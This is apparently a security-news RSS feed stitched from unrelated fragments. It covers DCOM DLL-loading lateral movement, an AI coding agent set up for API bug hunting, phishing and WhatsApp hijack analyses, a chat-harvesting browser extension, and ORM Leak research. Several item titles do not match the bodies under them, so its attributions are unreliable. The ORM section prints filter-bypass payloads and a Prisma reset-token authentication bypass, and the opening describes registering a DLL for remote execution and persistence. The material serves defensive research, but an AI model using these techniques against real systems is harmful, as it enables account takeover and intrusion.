object, I found that the Open function can trigger a DLL to be loaded into memory if it has been registered in the registry. For the purposes of this research, I created a DLL that basically just spawns a message box which is defined under the DllEntryPoint function. I registered it under HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls and then created a simple C++ COM client to call the Open function on this interface.As expected, the DLL was loaded into memory. It was hosted in the same way that it would be if the Control Panel itself was opened: through the COM Surrogate process (dllhost.exe). Using Process Explorer, it was clear that dllhost.exe loaded my DLL while simultaneously hosting the COpenControlPanel object along with other COM objects.COM Surrogate loading a custom DLL and hosting the COpenControlPanel objectBased on my testing, I made the following observations:The DLL that needs to be registered does not necessarily have to be a .cpl file; any DLL with a valid entry point will be loaded.The Open() function accepts the name of a Control Panel item as its first argument. However, it appears that even if a random string is supplied, it still causes all DLLs registered in the relevant registry location to be loaded into memory.Now, what if we could trigger this COM object remotely? In other words, what if it is not just a COM object but also a DCOM object? To verify this, we checked the AppID of the COpenControlPanel object using OleViewDotNet.COpenControlPanel object in OleViewDotNetBoth the launch and access permissions are empty, which means the object will follow the system’s default DCOM security policy. By default, members of the Administrators group are allowed to launch and access the DCOM object.Based on this, we can build a remote strategy. First, upload the “malicious” DLL, then use the Remote Registry service to register it in the appropriate registry location. Finally, use a trigger acting as a DCOM client to remotely invoke the Open() function, causing our DLL to be loaded. The diagram below illustrates the flow of this approach.Malicious DLL loading using DCOMThe trigger can be written in either C++ or Python, for example, using Impacket. I chose Python because of its flexibility. The trigger itself is straightforward: we define the DCOM class, the interface, and the function to call. The full code example can be found here.Once the trigger runs, the behavior will be the same as when executing the COM client locally: our DLL will be loaded through the COM Surrogate process (dllhost.exe).As you can see, this technique not only achieves command execution but also provides persistence. It can be triggered in two ways: when a user opens the Control Panel or remotely at any time via DCOM.The first step in detecting such activity is to check whether any Control Panel items have been registered under the following registry paths:HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CplsHKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\CplsHKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Control Panel\CplsAlthough commonly known best practices and research papers regarding Windows security advise monitoring only the first subkey, for thorough coverage it is important to monitor all of the above.In addition, monitoring dllhost.exe (COM Surrogate) for unusual COM objects such as COpenControlPanel can provide indicators of malicious activity.
Finally, it is always recommended to monitor Remote Registry usage because it is commonly abused in many types of attacks, not just in this scenario.In conclusion, I hope this research has clarified yet another attack vector and emphasized the importance of implementing hardening practices. Below are a few closing points for security researchers to take into account:As shown, DCOM represents a large attack surface. Windows exposes many DCOM classes, a significant number of which lack type libraries – meaning reverse engineering can reveal additional classes that may be abused for lateral movement.Changing registry values to register malicious CPLs is not good practice from a red teaming ethics perspective. Defender products tend to monitor common persistence paths, but Control Panel applets can be registered in multiple registry locations, so there is always a gap that can be exploited.Bitness also matters. On x64 systems, loading a 32-bit DLL will spawn a 32-bit COM Surrogate process (dllhost.exe *32). This is unusual on 64-bit hosts and therefore serves as a useful detection signal for defenders and an interesting red flag for red teamers to consider.]]></content:encoded></item><item><title>CrowdTour 2026: Securing the AI Era Together</title><link>https://www.crowdstrike.com/en-us/blog/crowdtour-2026-securing-ai-era-together/</link><author>Gautam Mehandru</author><category>threatintel</category><pubDate>Fri, 19 Dec 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Inside CrowdStrike&amp;rsquo;s Science-Backed Approach to Building Expert SOC Agents</title><link>https://www.crowdstrike.com/en-us/blog/inside-crowdstrikes-science-backed-approach-to-building-soc-agents/</link><author>Ted Driggs -

For tasks such as downloading a video I found on social media, so instead of googling a tool - I simply fire up one of these coding agents and let it figure out how to use yt-dlp.Another example is bypassing the password protection of a pdf - a bank had mailed me a pdf saying the password is your customer id 3XXXX721 and for the life of me I couldn't remember or find the customer id anywhere. So, instead of using an online service and upload a potentially sensitive document to the internet, I asked Claude Code to brute force the password since it was only 4 unknown digits. It wrote a python code which did the job locally on my mac.After seeing it crack a PDF in seconds for $0.27, being a security researcher, my next question was obvious: Can I teach it to hack APIs?
Since all these tools can run curl or grep to help with the tedious parts of API auditing. Along with the ability to execute code (via a sandbox preferably), it should be able to the job.Though these LLMs have some capability to do security checks - I thought it will surely benefit from some additional real world examples of security issues right here in its context. So, I put the description and reproducibility steps of security bugs I had found in my career right here in their system instructions (via files such as  or )This makes the system instructions a little too big for these LLMs' comfort with the description of around 150 security issues and they start to complain. Not only this is an issue for the latency, it causes every small  message to also carry the whole context, increasing the cost unnecessarily.Along with the above I needed to ask the Gemini CLI (or Claude Code) tool to run  in the background on port  and proxied my Chrome traffic through it. Since  was started by the CLI tool, it could access the logs from its stdout.mitmdump -p 8088 --set flow_detail=3Well, a quick and massive upgrade was to not log everything from  to the stdout - that would fill up the context quickly. So, I logged everything in a  file and asked CLI tool to use ,   etc. in the file for things it is looking for. This way CLI tool only sees the lines it is looking for which also saves cost.  I also decided to convert "starting mitmdump and directing its log to a file" into a  (a feature available in both Gemini CLI and Claude Code) -  so that I don't have to write a full please start mitmdump on 8088 and dont log anything on stdout and rather log it in log.txt~/Work/mitmclaude$ cat .claude/commands/start-mitm.md
# Start mitmproxy capture

Start mitmproxy to capture HTTP/HTTPS traffic with full request and response bodies.

## Instructions

Run the following command to start mitmdump in the background:


mitmdump -w traffic.mitm --set flow_detail=3 2>&1 | tee log.txt &The huge  carrying each bug detail was the other issue. Borrowing an idea from command of  above, I thought why not put descriptions and how to find that one category of bugs into one command, say   will refer to markdown file   which has only IDOR related vulnerabilities details.  And lets not dump all the descriptions of the bug report as it is - the direct dump of them from hf - but rather only the learnings from them and how to look for them. I used one of the top LLMs to make this conversion from  to How to look for these issues .From 150 security reports to 4000With the architecture finalized it was time to improve the scope of the tool. My own security bugs were a good starting point but I wanted a world class security researcher. So I went to the HackerOne's public disclosures. There is one dump available at hugging face  https://huggingface.co/datasets/Hacker0x01/hackerone_disclosed_reports?viewer_api=trueThere are roughly 10000 bugs in there and I filtered out 4000 from them which had some bounty payment, a proxy for a good impact bug, I assumed.
df  dfdfdfisin

⎿  === REPORTS WITH BOUN===
Total: 5383 out of 10094 (53.3%) ⏺ 4,186 high-value bounty reports filtered.With the data from 4000 security issues, all the 's markdown files were modified to include the new learning and new ways to find the issues, which in theory should make each command more robust.Putting it to action, I already found a low hanging fruit in 's  endpoint. The tool told me that they are using just USERNAME as the param. And for me it was my USERNAME@domain.com from my email address. So, I asked it to try vercel CEO's username from twitter which I thought would be his username here as well. It worked, confirming the bug. If it hadn't worked I would have asked it to try some other famous usernames.Transition From Researcher Controlled Tools To An Agentic ToolWhile letting the researcher control what to look for with  like , the goal of an "agentic" behaviour was still not achieved - I wanted the LLM to figure out what are the available commands and invoke them on their own - you can achieve this in three ways,create MCP endpoints which search these "commands" as an endpoint individually. So, when MCP calls  it will see those commands as the individual tools.or convert them into Skills if you are using Claude Codeor convert them into Skills and use coderunner to help bridge the gap for Skill->MCP conversion for you. Now you can use any tool you like Gemini CLI, Qwen CLI, OpenAI Codex etc.The content of a  is exactly same as the . The same markdown file can be just used as a  by putting it appropriate folder.~/Work/mitmclaude$ tree .claude/skills

The campaign uses a  and website compromise to deliver a sophisticated credential stealer to end users.In this blog, we explain how the attack was delivered, how it evaded detection, and how our SOC identified the underlying infrastructure.The HubSpot logo is shown solely to identify the company in this analysis of a phishing campaign. Evalian is not sponsored by or affiliated with HubSpot.How the spoofed Hubspot email bypassed email security controlsThe spoofed email urges users to log in to their HubSpot account to review their marketing campaign because of an increased number of unsubscribes detected. Interestingly, the URLs within the email were not malicious, but the attacker had inserted a phishing URL in the sender’s display name, as shown in the image above. This may be an attempt to bypass email security controls because the sender’s display name is not usually checked for malicious URLs.Alongside this, the attackers used a business email compromise attack to take control of a legitimate email address and then used MailChimp (an email marketing platform) to distribute the attack en masse.These techniques, when used together, allowed the email to bypass secure email gateways (SEGs) due to their trusted reputation.Compromised website used to deliver a credential stealerThe malicious URL indicates that a legitimate website (canvthis[.]com) has been compromised, redirecting the user to a credential stealer at hxxps://hubspot-campaigns[.]com/login. Investigating this URL within a sandbox browser shows a convincing login page that mimics the legitimate HubSpot login portal.Figure 2: Malicious HubSpot Login PageEntering fake credentials and investigating the POST requests shows that the login information is sent to a login.php file. The IP address the stealer is hosted on relates to Proton66 OOO with ASN AS 198953. Public reporting ties this ISP to a Russian bulletproof hosting service, which multiple attackers abuse to perform similar attacks.Figure 3: POST InformationFigure 4: IP OSINT ReportsOSINT on this IP shows it linking to multiple other attempted phishing campaigns.Analysis on the IP 193[.]143[.]1[.]220 confirmed with a high level of confidence that it is used in phishing infrastructure hosted in Russia (Saint Petersburg) on AS198953 (Proton66 OOO), an ASN frequently associated with spam and phishing activity.The host uses a Plesk-managed VPS with an auto-generated hostname (*.plesk[.]page), exposing a full mail stack (Postfix + Dovecot) alongside publicly accessible Plesk admin panels. This setup is commonly abused for short-lived phishing campaigns.Disposable plesk.page subdomain with no legitimate brand identityExposed SMTP, IMAP, and submission services using legacy authentication methodsSelf-issued Plesk TLS certificates on mail services, consistent with STARTTLS abuseThe host exposes an unusually broad range of open ports, indicating a generic, over-exposed VPS template rather than a hardened production system. Critical services include SMTP (25/465), IMAP (143/993), and ManageSieve (4190), confirming the presence of a complete mail stack commonly used in phishing campaigns.Additional exposed services such as DNS (53), SSH (22), HTTP/HTTPS (80/443), and multiple Plesk administrative interfaces (8443, 8880) further reinforce this assessment. Publicly accessible control panels are frequently abused to rapidly deploy phishing pages, manage mailboxes, and rotate campaign infrastructure.Figure 5: Shodan ReportingThe host exposes an unusually broad range of open ports, indicating a generic, over-exposed VPS template rather than a hardened production system. Critical services include SMTP (25/465), IMAP (143/993), and ManageSieve (4190), confirming the presence of a complete mail stack commonly used in phishing campaigns.Additional exposed services such as DNS (53), SSH (22), HTTP/HTTPS (80/443), and multiple Plesk administrative interfaces (8443, 8880) further reinforce this assessment. Publicly accessible control panels are frequently abused to rapidly deploy phishing pages, manage mailboxes, and rotate campaign infrastructure.With confidence in the infrastructure indicators and tactics, we moved to detection engineering. The goal wasn’t just to stop this email; it was to detect the campaign wherever it might appear next. Below is a detection/threat-hunting query used to identify further attempts.These detections were deployed across all our customers. Although only one customer received the original phishing email, others could have been targeted next.Why SPF, DKIM and DMARC are not enough to stop phishingThis campaign was a layered deception engineered to evade detection and exploit trust at every step. The attackers abused legitimate email infrastructure, leveraging MailChimp and a trusted business’ domain to sneak through spam filters with fully authenticated messages.This investigation underscores how modern phishing operations have evolved. It’s no longer about crude HTML and spelling mistakes. Instead, attackers are combining brand impersonation and infrastructure-as-a-service to scale fast, phish wide, and stay ahead of basic defences.What this means for Security Operations CentresFor a SOC, this means going beyond blocking domains. It’s about hunting infrastructure patterns, monitoring cloud mail providers like MailChimp, pivoting on TLS artefacts like JARM fingerprints, and educating users to question even the most polished messages. SPF, DKIM, and DMARC do not guarantee that a message is safe, only that it was not forged at the SMTP level and came from an authorised sender.Attackers are increasingly piggybacking on trusted third-party mail platforms like MailChimp, SendGrid, Salesforce and sending through domains with properly configured email authentication. In this case, the phishing campaign weaponised trust by using a legitimate and reputable domain, to pass all filtering checks and reach the inbox clean.SOC as a Service helps detect advanced phishing campaignsIf you’d like to understand how our SOC as a Service can help you strengthen your organisation’s security framework, get in touch with our friendly team.T1566.002 – Phishing: Spearphishing LinkDetects emails that trick users into clicking malicious URLs.The attacker is impersonating a legitimate service.T1056.007 – Input Capture: Web Portal CaptureThe final payload is a fake login page to capture user credentials.Indicators of Compromise:hxxps://canvthis[.]com/en/hxxps://hubspot-campaigns[.]com/login/HubSpot logo used for informational purposes only.]]></content:encoded></item><item><title>The ghosts of WhatsApp: How GhostPairing hijacks accounts</title><link>https://www.malwarebytes.com/blog/news/2025/12/the-ghosts-of-whatsapp-how-ghostpairing-hijacks-accounts</link><author></author><category>threatintel</category><pubDate>Thu, 18 Dec 2025 13:37:27 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[Researchers have found an active campaign aimed at taking over WhatsApp accounts. They’ve called this attack  because it tricks the victim into completing WhatsApp’s own device-pairing flow, silently adding the attacker’s browser as an invisible linked device on the account.Ghost of WhatsApp Past: When it was just youDevice pairing lets WhatsApp users add additional devices to their account so they can read and reply to messages from a laptop or through WhatsApp Web.Compared to similar platforms, WhatsApp’s main strengths are its strong end-to-end encryption and seamless cross-platform use. But cybercriminals have found a way to abuse that cross-platform use to bypass the encryption.In the Ghost of WhatsApp Past, everything looks normal. It’s just you and the devices you meant to connect. The same mechanism that makes life easier later gets abused to let in an uninvited guest. And that renders the end-to-end encryption useless when the attacker gains direct access to the account.Ghost of WhatsApp Present: The “I found your photo” momentSo, all is well. Until the target receives a message along the lines of “Hey, check this, I found your photo!” accompanied by a link.The link, and the website it leads to, are designed to look like they belong to Facebook (which, like WhatsApp, is owned by Meta).This fake login page provides instructions to log in with their phone number to continue or to verify before viewing the photo. The scammers then use the provided phone number to submit a WhatsApp “device pairing” request for it.The researchers observed two variants of the attack. One that provides a QR code to scan with WhatsApp on your phone. The other sends a numeric code and tells the user to enter it into WhatsApp to confirm a login.In the second scenario, the victim opens WhatsApp, sees the pairing prompt, types the code, and believes they are completing a routine verification step, when in fact they have just linked the attacker’s browser as a new device.This is the attacker’s preferred approach. In the first, the browser-based QR-code occurs on the same device as the WhatsApp QR-code scan—QR codes normally expect a second device—and might give people the chance to think about what’s really going on.Ghost of WhatsApp Future: When the ghost settles inWith the new access to your WhatsApp account, the criminals can:Read all your new and synced messages.Download photos, videos, and voice notes.Send the same “photo” lure to your contacts and spread the scam.Impersonate you in direct and group chats.Harvest messages, images, and other information to use in future scams, social engineering, and extortion.And they can do much of this before the real account owner notices that something is wrong.What Scrooge can learn from all thisIt’s not the first time scammers have used tricks like these to take over accounts. Facebook has seen many waves of similar scams.There are a few basic measures you can take to avoid falling for lures like these.Don’t follow unsolicited links sent to you, even if they’re from an account you trust. Verify with the sender that it’s safe. In some cases, you’ll be helpfully warning them their account is compromised.Read prompts and notifications. Many of us have trained ourselves to click all the right buttons to get through the flow as quickly as possible without reading what they’re actually doing, but it’s a dangerous habit.If you have fallen victim to this, here’s what to do.Tell your WhatsApp contacts that your account may have been abused and not to click any “photo” links or verification requests that might have come from you.Immediately revoke access: go to  →  and log out of all browsers and desktops you do not explicitly use. When in doubt, remove everything and re‑link only the devices you own.We don’t just report on threats – we help protect your social media]]></content:encoded></item><item><title>ThreatsDay Bulletin: WhatsApp Hijacks, MCP Leaks, AI Recon, React2Shell Exploit and 15 More Stories</title><link>https://thehackernews.com/2025/12/threatsday-bulletin-whatsapp-hijacks.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNeJtuRy-gjytN_j0MAXAb1xvnGYRgQ0DDQnZzdAo5jaT8C8zPIYpYrEBrJykOsYixevHoF4rfux8jhSgmKdO0_URETDCJwbVdLzdyj2tsOVobmrROO8OUZb9UGqThi3ah-T1tqvl-EsIInns9yOxYA-PJzupTJlRne0bAIqDS8PA6EJjzG8qQf1vYOpsI/s1600/threatsday-main.jpg" length="" type=""/><pubDate>Thu, 18 Dec 2025 13:10:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[This week’s ThreatsDay Bulletin tracks how attackers keep reshaping old tools and finding new angles in familiar systems.

More than seven million users of a VPN extension for Google Chrome and Microsoft Edge found that out the hard way this week after researchers at Koi Security revealed the browser extension had been logging users’ AI chats and sending them to a data broker.Urban VPN Proxy looked like a reputable program. It sat in the Chrome Web Store with a 4.7-star rating and Google’s “Featured” badge, which is meant to indicate that an extension meets higher standards for user experience and design. More than six million people downloaded the Chrome version of the tool, which ironically claims to protect users’ online privacy. Another 1.3 million installed it on Microsoft Edge.The extension was originally benign, but then on July 9, 2025 its publisher, Urban Cybersecurity, shipped version 5.5.0. According to Koi Security, that update introduced code that intercepted every conversation users had with eight AI assistant platforms: ChatGPT, Claude, Gemini, Microsoft Copilot, Perplexity, DeepSeek, Grok (xAI), and Meta AI.The extension intercepted chat prompts from the user’s browser, along with responses from the AI. It then reportedly packaged them up and sent them to Urban Cybersecurity’s parent company, BiScience (B.I Science (2009) Ltd). That is a data broker company, which collects browsing history and device IDs from millions of users.As Koi Security points out in its report, Urban Cybersecurity  mention AI data collection in the consent screen that it shows during product setup. It says: “…we process certain browsing data such as pages you visit, your network connection, ChatAI communication, and security signals, as outlined in our Privacy Policy.” The privacy policy further explains what data it collects and says that it discloses the data for marketing analytics purposes.There are two problems with that. First, the extension silently auto-updates on Chrome and Microsoft Edge browsers, as Koi Security points out. That means users who installed an earlier, non-harvesting version installed would have been automatically upgraded to the chat-slurping version in July and been none the wiser—unless they happened to read updated privacy policies for fun.fromSecond, the Chrome Web Store listing reportedly described the product as protecting people from entering personal information into AI chatbots. That claim is hard to square with the fact that the extension captures and exfiltrates AI chats regardless of whether its protection features are turned on, according to Koi.The researchers also found that seven other extensions from the same publisher contained identical harvesting code, bringing the total number of affected users to more than eight million. Koi Security published a list of those extensions in its report.Why data brokers love AI chatWith people inclined to tell AI sessions increasingly personal things, this secretive harvesting should worry us. Set aside for a minute those who confess to crimes, or those who pour out deeply private thoughts while using AI as a form of therapy. Many other chats are filled with things that feel more mundane but are still highly sensitive: job advice (people have shared full resumes with AI chats), medical symptoms, family planning questions, study materials, and legal queries.Those conversations are often far more detailed and revealing than traditional search engine queries. If data brokers obtain them, they can mine the content for personal insights and link it with other data they already hold about you.Second, be careful what you tell AI assistants. Even if nothing is intercepting the conversation locally, the company operating the AI itself might be made to hand over chat data, as OpenAI was earlier this month.Google’s “Featured” badge says extensions “follow our technical best practices and meet a high standard of user experience and design” but this seems to have been one that slipped through the next. As of last night, Urban Proxy VPN and Urban Cybersecurity’s other apps appeared to have been removed from the Chrome Web Store. The ones identified by Koi Security on the Microsoft Edge Add-ons store were still available, though.If you used any of these extensions, were unaware of the situation and are unhappy about it, you should assume that any AI chats since July 9 this year may have been compromised. To remove extensions, you can do so in Chrome by visiting chrome://extensions and in Edge by visiting edge://extensions. You may also want to reset passwords and clear browser caches and cookies.We don’t just report on privacy—we offer you the option to use it.]]></content:encoded></item><item><title>North Korea-Linked Hackers Steal $2.02 Billion in 2025, Leading Global Crypto Theft</title><link>https://thehackernews.com/2025/12/north-korea-linked-hackers-steal-202.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgMHTdmzsADACELwHA_CbIZVsam4MNGitGEgbHD2jOysPFLnZerWmRSZtTJzSkOJagPS8pmFni0SE8Jp63CEMJFDTjnNx51ND6Px3RCC5W37i61m_PrgB7T5KoghRqtVCvy6A0Bx4LVnZFEm8CijNS2RxOlxeC_3roMiJRqe9bWn2N92dj77mjYsGptVWUS/s1600/north-korean-hackers.jpg" length="" type=""/><pubDate>Thu, 18 Dec 2025 13:00:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Threat actors with ties to the Democratic People's Republic of Korea (DPRK or North Korea) have been instrumental in driving a surge in global cryptocurrency theft in 2025, accounting for at least $2.02 billion out of more than $3.4 billion stolen from January through early December.

We also demonstrate an authentication‑bypass technique for the Prisma ORM that was omitted from our original Prisma article.We further argue that the introduction of an ORM Leak vulnerability does not depend on the use of a susceptible ORM such as Django or Prisma. Developers frequently implement robust filtering capabilities that parse user input into filter expressions for the underlying ORM of their choice, yet it is commonly overlooked that filtering on sensitive attributes should be disallowed.To demonstrate this, we show how Microsoft’s OData API can unintentionally expose sensitive attributes and Entity Framework filtering functionality. This behaviour was abused during a project earlier this year, where we were also able to bypass naive protections intended to prevent filtering of sensitive data.Recap of the Previous ORM Leak ArticlesIn this article, we introduced the ORM Leak vulnerability class and demonstrated vulnerable uses of the Django ORM that allowed filtering on sensitive fields. We showcased a variety of exploitation techniques, including many-to-many relational filtering payloads that pivot through relationships to reach sensitive fields on connected objects. We also highlighted that response length differences are not the only viable oracle for ORM Leak attacks, showing how ReDoS payloads on a MySQL database can be used to perform error-based attacks.This article demonstrated that the Prisma ORM is also susceptible to similar relational filtering attacks to those showcased in our Django article, when developers allow users to control the  option, albeit with a different filtering syntax. Since Prisma provides greater control over the generated SQL queries compared to Django, we explored time-based attacks, which led to the development of , a tool for exploiting time-based ORM Leak vulnerabilities.Beego is one of the most popular Golang web frameworks (over 32k GitHub stars). Its filtering syntax is heavily inspired by the Django ORM, as shown in the example below.Similarly, the Beego ORM adopts the same convention as Django for relational filtering.As a result, an ORM Leak vulnerability can be easily introduced when using the Beego ORM if a developer allows a user to control the filter expression parameter for the  function.<1> Vulnerable to ORM leaks if the user controls the  parameter.All the ORM Leak attacks discussed in our plORMbing your Django ORM blog article also apply to the Beego ORM. For this reason, we initially chose not to publish our findings that Beego was similarly susceptible.However, earlier this year we decided to see how quickly we could discover an ORM Leak vulnerability in a large open-source project, and we came across this code snippet in Harbor in under 20 minutes.Harbor CVE-2025-30086 - Initial VulnerabilityHarbor is a popular open‑source container registry (over 27k GitHub stars) built using the Beego web framework, and it relies on the Beego ORM for managing application data. The snippet above was located in the  function shown below. This function was used to parse the  URL parameter for all  API handler endpoints.<1> The ORM Leak sink that was identified by searching for the qs.Filter\([a-zA-Z0-9_]*,\s*[a-zA-Z0-9_]*\) pattern on Sourcegraph.For example, the  URL parameter for GET /api/v2.0/users?q=email=~elttam.com would be parsed as the  filter expression for the Beego ORM, returning all users whose email addresses contain . However, there were no protections to prevent users from filtering on sensitive attributes such as  or .Oddly, Harbor did not use the relational features of the ORM and instead relied on custom SQL for applying table joins in specific cases. This inadvertently reduced the exploitability of the ORM Leak vulnerability, as we could not use relational filtering techniques on endpoints accessible to low‑privileged or unauthenticated users. Exploitation required sufficient permissions to list other users.This basic ORM Leak pattern is a common mistake we observe during engagements: an endpoint parses a user‑controllable filter constraint for querying users without preventing filtering on sensitive attributes.What made this specific vulnerability in Harbor particularly interesting—and worth publishing—was our ability to repeatedly bypass Harbor’s patches due to how the Beego ORM parses filter expressions in its  method.Harbor CVE-2025-30086 - Bypassing the Deny List PatchIn Harbor version , the  validation function was introduced to set the  attribute of a model field to  if the field does not have the  annotation set to  when parsing a data model, and to  otherwise. Sensitive model fields were then annotated with , as shown in the following snippet from the  data model.The  attribute was then validated when parsing the user-controlled  parameter in  (shown below). If it was , the corresponding filter constraint was removed.<1> Splits the user controllable filter expression and retrieves the first section as the .<2> Validates if the  was filterable.Note that Harbor only validated the start of the filter expression, so if Harbor did utilise the relational features of the Beego ORM, this protection could have been easily bypassed using relational filters. However, we were not afforded that luxury.We did, however, notice an interesting quirk in how the Beego ORM parses non-relational fields within a filter expression via the  function. The filter expression is first split by the  expression section separator, and the  function then iterates over each segment in a loop. If a non-relational field is used as though it were a relational field—such as  in the  filter expression—it is overwritten by the subsequent field in the expression.In practice, this means the filter expression email__password__startswith is equivalent to  when using the Beego ORM, which conveniently bypasses Harbor’s deny-list patch.Harbor CVE-2025-30086 - Bypassing Filter Expression LimitationsThe second patch Harbor implemented in  restricted the filter expression in the  input to allow only a single use of the Beego expression separator (). The intention was to still allow users to choose a Beego operator for filtering fields, while preventing the email__password__startswith bypass described in the previous section.<1> Only allows one occurrence  in the filter expression.The issue with this patch is that Harbor maintains its own mapping to Beego operators based on the format of the .<1> The  Harbor query format.<1> Inserts the insensitive contains () operator if the query value is a .Using this, Harbor’s second patch was bypassed by leveraging the  value format with the  filter expression. However, the case sensitivity of the  field was lost due to the use of the  Beego operator.Harbor CVE-2025-30086 - The Final PatchIn Harbor version , the ORM Leak vulnerability was finally patched by validating the second section of a filter expression against a set of allowed Beego operators. This effectively validates the entire filter expression input and prevents payloads such as .Key Takeaways from Harbor CVE-2025-30086There are three key takeaways from the ORM Leak vulnerability we discovered in Harbor:Robust Filtering CapabilitiesOne root cause of this vulnerability was that the Harbor API allowed user inputs to set both the  and  for filtering users, without validating against .This type of issue is  in our engagements, even on targets under bug bounty programs. Basic ORM Leak vulnerabilities appear more frequently than similar classes like SQL injection.The Beego ORM Filter Expression Parsing is BrokenThe broken parsing in the  function can be exploited to bypass naive ORM Leak protections that do not validate the entire filter expression containing user-controlled sections.We reported this parsing issue to the Beego contributors in May 2025, but did not receive an adequate response. The issue is still present in the latest version () at the time of this article.This is not the first filter expression parsing bug discovered that could bypass ORM Leak protections. For example, Strapi -  allowed insertion of a  SQL condition with a field that did not exist on the corresponding model, bypassing Strapi’s patch for .Application Mappings to ORM OperatorsDevelopers often implement mappings from user input to ORM operators, which can inadvertently introduce ORM Leak vulnerabilities.During another engagement, we observed this with the Sequelize ORM, which uses a syntax similar to Prisma ORM. While Sequelize itself is generally resistant to ORM Leaks because its operators are JavaScript  types, a middleware in the application we were testing mapped string inputs to Sequelize operators, resulting in an ORM Leak vulnerability.Prisma ORM Authentication BypassIn our original Prisma ORM Leak article, we overlooked including a common mistake that we have observed: assuming the type of a user input when filtering by a field.For example, the following TypeScript snippet shows a password reset endpoint in an ExpressJS application that resets the password for the first user where the  field is  to the provided  input.<1> Assumption that the  input is a  type.Ignoring the insecure non-constant time comparison when comparing a sensitive value within a database query, there is an implicit assumption that the user input is of type  and that a simple equality comparison will be performed. However, as mentioned previously, the Prisma ORM uses an object-based syntax, where operators are defined using .In this case the  value in the JSON request can be manipulated into an  that injects a Prisma operator. In the following example, this bypasses the reset token validation by injecting the  condition, which is conceptually similar to NoSQL injection.Another useful operator for bypassing authentication checks in Prisma is , particularly when you want to avoid compromising the first user in the users table.JSON request bodies are not the only way to coerce user input into an object type in ExpressJS (one of the most common frameworks we see used with Prisma).For URL-encoded request bodies, if the extended option is enabled for the middleware (app.use(express.urlencoded({ extended: true }))), an input such as  is parsed into the object {"resetToken": {"not": "E"}}, injecting the  condition.Another commonly overlooked input vector is cookies. If the ExpressJS  middleware is enabled, it supports , which parse cookie values prefixed with  using . A header such as Cookie: resetToken=j:{"not": "E"} would result in the  cookie being parsed into an object, injecting the  condition when used in a Prisma filter.In summary, when input type validation is missing and the Prisma ORM is used, the resulting impact can be severe.Leaking Non-Susceptible ORMsAs mentioned in the key takeaways section on the Beego ORM, one point we want to clarify for software engineers and security testers is that the introduction of an ORM Leak vulnerability does not depend on using a susceptible ORM such as Django, Prisma, or Beego.The most common root cause we observe is the growing trend for web applications to offer robust filtering or search capabilities, which can be abused to filter objects by sensitive or hidden fields. Developers often rely on the ORM to determine which fields are queryable and to prevent SQL injection, but overlook explicitly validating which fields  be queryable.A good example of this issue arises with  features in applications using the , which we consider not inherently susceptible to ORM Leaks. Introducing an ORM Leak using Entity Framework typically requires additional custom parsing logic for a user input. By contrast, demonstrating ORM Leaks with Django, Beego, or Prisma often requires only a single line of code.<1> Includes all properties of the given  data model that are a  type, which could contain sensitive fields.<2> Will also search by the value of sensitive fields.Generated SQL that filtered sensitive  fields using the user controllable  input.info: Microsoft.EntityFrameworkCore.Database.Command[20101]

      FROM [Users] AS [u]
      WHERE [u].[Username] LIKE N'%attackerinput%' OR [u].[Password] LIKE N'%attackerinput%' OR [u].[ApiToken] LIKE N'%attackerinput%'
      ORDER BY [u].[Username]
      OFFSET @__p_0 ROWS FETCH NEXT @__p_1 ROWS ONLY
It is a common mistake in web applications for utility search functions to inadvertently filter on sensitive fields within a data model.Directus CVE-2025-64748, published last month, is a good example of this issue. In this case, the application included the  and  fields when searching objects in the  collection, as shown in the generated SQL from Directus.There are also libraries that add advanced filtering capabilities to API endpoints by integrating with an underlying ORM, which can inadvertently introduce ORM Leak vulnerabilities.Leaking EntityFramework using OData Query EndpointsFor example, in the following  and  models, the  model has an association to a  object via the  field.Adding data models to the EDM is done using the ODataConventionModelBuilder class. In the following snippet, it is important to note that  was explicitly included.The EDM can then be retrieved from the  endpoint. In our example application, the  model was automatically included in the EDM due to its association with the  model, even though it was not explicitly added.This is a common issue with OData APIs, where sensitive fields can be inadvertently included in the EDM and potentially exposed via an OData query endpoint using the  option.OData controller for the  that has an OData query endpoint<1> Enables OData query options.<2> The OData API parses user inputs into a LINQ expression that is then applied to the returned , which in this case are the  objects from EntityFramework.In that engagement, the developer used the following protections to mitigate against the leaking of sensitive fields:Sensitive fields were marked using a custom annotation that disabled the use of all OData functions (e.g.,  and ) to prevent search operations on those fields.To replicate these protections, we just added the AllowedQueryOptions = AllowedQueryOptions.Filter and AllowedFunctions = AllowedFunctions.None options to our OData query endpoint in a demo application, as shown below:The first protection was easily bypassed, as we could still write OData filter expressions on sensitive fields as part of an ORM Leak attack. However, the  and  functions remained disabled.To work around this, we used logical operators that were not disabled to perform comparisons based on the  (discussed in the next section) between a sensitive field and a string we controlled, allowing us to leak the full value.Logical Operators Are Commonly Overlooked as a Search MechanismLogical operators such as greater than (, , etc.) and less than (, , etc.) can be used in ORM Leak attacks, yet are often overlooked by developers as a means of searching sensitive field values. We have used logical operators on multiple occasions to successfully exploit ORM Leak vulnerabilities.With Entity Framework, we have shown that introducing an ORM Leak vulnerability typically requires more code than with more susceptible ORMs. However, this does not prevent developers from implementing filtering input parsers that can be abused to query the values of sensitive fields.A Note About Database CollationOne concept we have omitted from our ORM Leak articles for the sake of simplicity is , which defines the rules a database uses to store and  data. Database collation can significantly impact the exploitation of ORM Leak vulnerabilities. For example, losing case-sensitivity due to the use of a case-insensitive collation, where the following databases use a case-insensitive collation by default:Additionally, some ORMs attempt to handle case sensitivity at the application layer rather than relying on the database collation (e.g., Django and Beego), while others defer entirely to the database collation (e.g., Prisma and Entity Framework). Even then, ORMs that attempt to enforce case sensitivity may fail for certain database backends.Louis Nyffenegger from PentesterLab provides a good example of this with Django and SQLite. In this case, the Django ORM loses case sensitivity for SQLite databases when using the  or similar operators 